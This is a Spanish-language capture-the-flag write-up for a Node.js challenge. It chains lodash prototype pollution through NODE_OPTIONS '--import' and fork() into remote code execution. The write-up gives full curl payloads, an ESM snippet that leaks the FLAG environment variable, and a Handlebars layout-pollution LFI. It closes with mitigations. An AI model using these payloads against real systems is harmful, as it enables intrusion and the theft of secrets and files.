# Utopia City Old Portal - Writeup

## 🚩 Flag

```
flag{4d286d27805a4f0d}
```

## Resumen

Explotación de **Prototype Pollution to RCE (PP2RCE)** en una aplicación Node.js usando `lodash` vulnerable y `child_process.fork()`.

---

## Reconocimiento

### Análisis del Código Fuente

Se proporcionó el código fuente de la aplicación. Puntos clave identificados:

1. **Librería Vulnerable:** `lodash` versión `4.17.15` (vulnerable a Prototype Pollution)
2. **Sink de Polución:** `_.set(config, key, req.body.config[key])` en `/api/contact`
3. **Gadget RCE:** `child_process.fork()` ejecutado después de cada request
4. **Flag Location:** Variable de entorno `FLAG` (confirmado en `docker-compose.yml`)

```javascript
// Vulnerable code in app.js (lines 92-94)
Object.keys(req.body.config).forEach((key) => {
  _.set(config, key, req.body.config[key]);
});

// RCE Gadget (lines 106-121)
const child = fork(scriptPath);
```

### Pista en main.js

El archivo `/public/js/main.js` contenía hints del CTF con payloads de ejemplo:

```javascript
// debugUtils.testPP2RCE("echo $FLAG", "import") - Get flag using --import method
// debugUtils.testPP2RCE("echo $FLAG", "env") - Get flag using env method
```

---

## Explotación

### Vector de Ataque: PP2RCE via NODE_OPTIONS

La técnica consiste en contaminar `Object.prototype.NODE_OPTIONS` con el flag `--import` que permite cargar módulos ESM desde data URIs.

### Payload ESM

El payload debe usar sintaxis ESM (no CommonJS) porque `--import` crea un contexto de módulo ES:

```javascript
import { writeFileSync } from "fs";
writeFileSync("/app/public/flag_esm.txt", process.env.FLAG || "NO_FLAG");
```

**Base64:**

```
SECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYTk9fRkxBRyIp
```

### Paso 1: Contaminar NODE_OPTIONS

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"config": {"constructor.prototype.NODE_OPTIONS": "--import data:text/javascript;base64,SECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYTk9fRkxBRyIp"}}' \
  https://dd89b68620f4d475.chal.ctf.ae/api/contact
```

### Paso 2: Triggear fork()

Enviar otro request para que `fork()` se ejecute con el `NODE_OPTIONS` contaminado:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"config": {"department": "trigger"}}' \
  https://dd89b68620f4d475.chal.ctf.ae/api/contact
```

### Paso 3: Leer el Flag

```bash
curl https://dd89b68620f4d475.chal.ctf.ae/flag_esm.txt
```

**Output:**

```
flag{4d286d27805a4f0d}
```

---

## Cadena de Explotación

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. POST /api/contact con payload de polución                    │
│    {"config": {"constructor.prototype.NODE_OPTIONS": "..."}}    │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. lodash.set() contamina Object.prototype.NODE_OPTIONS         │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. fork() hereda NODE_OPTIONS contaminado                       │
│    → Node.js ejecuta --import data:text/javascript;base64,...   │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. Payload ESM escribe process.env.FLAG a /app/public/flag.txt  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────────┐
│ 5. GET /flag_esm.txt → flag{4d286d27805a4f0d}                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## Vulnerabilidades Adicionales Descubiertas

### Local File Inclusion (LFI)

También se descubrió LFI via Handlebars layout pollution:

```bash
# Contaminar extname y layout
curl -X POST -H 'Content-Type: application/json' \
  -d '{"config": {"constructor.prototype.extname": "", "constructor.prototype.layout": "../../app.js"}}' \
  https://dd89b68620f4d475.chal.ctf.ae/api/contact

# Leer archivo
curl https://dd89b68620f4d475.chal.ctf.ae/
```

Esto permite leer archivos arbitrarios del servidor (app.js, package.json, etc.)

---

## Mitigaciones

1. **Actualizar lodash** a versión >= 4.17.21
2. **Sanitizar keys** antes de usar `_.set()` (bloquear `__proto__`, `constructor`, `prototype`)
3. **Usar Object.create(null)** para objetos de configuración
4. **No usar fork()** después de procesar input del usuario

---

## Referencias

- [Prototype Pollution to RCE](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)
- [CVE-2019-10744 - lodash Prototype Pollution](https://nvd.nist.gov/vuln/detail/CVE-2019-10744)
- [Node.js --import flag](https://nodejs.org/api/cli.html#--importmodule)
